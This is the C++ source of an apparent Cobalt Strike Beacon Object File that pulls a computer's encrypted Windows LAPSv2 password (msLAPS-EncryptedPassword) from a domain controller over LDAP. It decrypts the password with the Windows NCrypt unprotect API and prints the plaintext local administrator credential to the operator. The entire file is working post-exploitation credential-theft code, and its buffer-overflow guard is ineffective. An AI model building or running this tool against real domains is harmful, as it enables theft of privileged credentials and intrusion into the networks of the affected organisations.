#include <stdio.h>
#include <Windows.h>
#include <ncrypt.h>
#include <ncryptprotect.h>
#include <Winldap.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {

#include "beacon.h"

    struct blob_header {
        unsigned int upperdate;
        unsigned int lowerdate;
        unsigned int encryptedBufferSize;
        unsigned int flags;
    };

    bool searchLdap(PSTR ldapServer, ULONG port, PCHAR distinguishedName, PCHAR searchFilter, char **output, int* length) {

        DFR_LOCAL(wldap32, ldap_initA);
        DFR_LOCAL(wldap32, ldap_bind_sA);
        DFR_LOCAL(wldap32, ldap_search_s);
        DFR_LOCAL(wldap32, ldap_count_entries);
        DFR_LOCAL(wldap32, ldap_first_entry);
        DFR_LOCAL(wldap32, ldap_get_values_lenA);
        DFR_LOCAL(wldap32, ldap_get_values);
        DFR_LOCAL(wldap32, ldap_msgfree);

        LDAP *ldapHandle;
        PLDAPMessage searchResult = NULL;
        PCHAR attr[] = { "msLAPS-EncryptedPassword", NULL };
        ULONG entryCount;
        PLDAPMessage firstEntry = NULL;
        berval** outval;

        ldapHandle = ldap_initA(ldapServer, port);
        if (ldapHandle == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Error Initialising LDAP connection: ldap_initA");
            return false;
        }

        if (ldap_bind_sA(ldapHandle, distinguishedName, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Error Initialising LDAP connection: ldap_bind_sA");
            return false;
        }
            
        if (ldap_search_s(ldapHandle, distinguishedName, LDAP_SCOPE_SUBTREE, searchFilter, attr, 0, &searchResult) != LDAP_SUCCESS) {
            
            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "Error Using LDAP connection: ldap_search_s");
            return false;
        }

        entryCount = ldap_count_entries(ldapHandle, searchResult);
        if (entryCount == 0) {

            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "0 results found from LDAP");
            return false;
        }

        firstEntry = ldap_first_entry(ldapHandle, searchResult);
        if (firstEntry == NULL) {

            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            BeaconPrintf(CALLBACK_ERROR, "Error ldap_first_entry");
            return false;
        }

        outval = ldap_get_values_lenA(ldapHandle, firstEntry, attr[0]);
        if (outval == NULL) {

            if (searchResult != NULL)
                ldap_msgfree(searchResult);

            if (firstEntry != NULL)
                ldap_msgfree(firstEntry);

            BeaconPrintf(CALLBACK_ERROR, "Error ldap_get_values_lenA");
            return false;
        }

        *output = (char*)outval[0]->bv_val;
        *length = outval[0]->bv_len;

        return true;
    }

    SECURITY_STATUS WINAPI decryptCallback(
        void* pvCallbackCtxt,
        const BYTE* pbData,
        SIZE_T cbData,
        BOOL isFinal
        ) {

        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Output: %ls", pbData);

        return 0;
    }

    bool unprotectSecret(BYTE* protectedData, ULONG protectedDataLength) {

        BYTE* secData = NULL;
        ULONG secDataLength = 0;
        SECURITY_STATUS error;

        DFR_LOCAL(NCRYPT, NCryptStreamOpenToUnprotect);
        DFR_LOCAL(NCRYPT, NCryptUnprotectSecret);
        DFR_LOCAL(NCRYPT, NCryptStreamUpdate);
        DFR_LOCAL(NCRYPT, NCryptStreamClose);

        NCRYPT_PROTECT_STREAM_INFO streamInfo;
        NCRYPT_STREAM_HANDLE streamHandle;
        NCRYPT_DESCRIPTOR_HANDLE unprotectHandle;

        streamInfo.pfnStreamOutput = decryptCallback;
        streamInfo.pvCallbackCtxt = NULL;

        BeaconPrintf(CALLBACK_ERROR, "Decrypting secret...");

        if ((error = NCryptStreamOpenToUnprotect(&streamInfo, NCRYPT_SILENT_FLAG, 0, &streamHandle)) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "NCryptStreamOpenToUnprotect error: %x", error);
            return false;
        }

        if ((error = NCryptStreamUpdate(streamHandle, protectedData + 16, protectedDataLength - 16, true)) != 0) {

            NCryptStreamClose(streamHandle);

            BeaconPrintf(CALLBACK_ERROR, "NCryptStreamUpdate error: %x", error);
            return false;
        }

        NCryptStreamClose(streamHandle);

        return true;
    }

    void go(char* args, int len) {
        unsigned char* output;
        int length;
        struct blob_header* header;
        datap  parser;

        DFR_LOCAL(MSVCRT, sprintf);
        
        char* domainController;
        char* distinguishedName;
        char* rootDN;
        char ldapSearch[1024];
        int stringSize = 0;

        BeaconDataParse(&parser, args, len);

        domainController = BeaconDataExtract(&parser, NULL);
        rootDN = BeaconDataExtract(&parser, NULL);
        distinguishedName = BeaconDataExtract(&parser, &stringSize);

        if (stringSize > sizeof(ldapSearch) - 45) {
            // Don't want an accidental overflow crashing the BOF
            ldapSearch[1024 - 45] = '\0';
        }

        sprintf(ldapSearch, "(&(objectClass=computer)(distinguishedName=%s))", distinguishedName);
        if (!searchLdap(domainController, 389, rootDN, ldapSearch, (char**)&output, &length)) {
            return;
        }

        header = (struct blob_header*)output;
        BeaconPrintf(CALLBACK_OUTPUT, "LAPSv2 Blob Header Info:\nUpper Date Timestamp: %d\nLower Date Timestamp: %d\nEncrypted Buffer Size: %d\nFlags: %d", header->upperdate, header->lowerdate, header->encryptedBufferSize, header->flags);

        if (header->encryptedBufferSize != length - sizeof(struct blob_header)) {
            BeaconPrintf(CALLBACK_ERROR, "Header Length (%d) and LDAP Returned Length (%d) Don't Match.. decryption may fail", header->encryptedBufferSize, length-sizeof(blob_header));
        }

        if (!unprotectSecret((BYTE*)output, length)) {
            BeaconPrintf(CALLBACK_ERROR, "Could not unprotect LAPS creds");
            return;
        }
    }
}
#
// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    // the pack function takes one or more arguments
    bof::runMocked<const char*,const char*,const char*>(go, "dc01.lab.local", "DC=lab,DC=local", "CN=WINCLIENT,OU=LAPSManaged,DC=lab,DC=local");
    return 0;
}
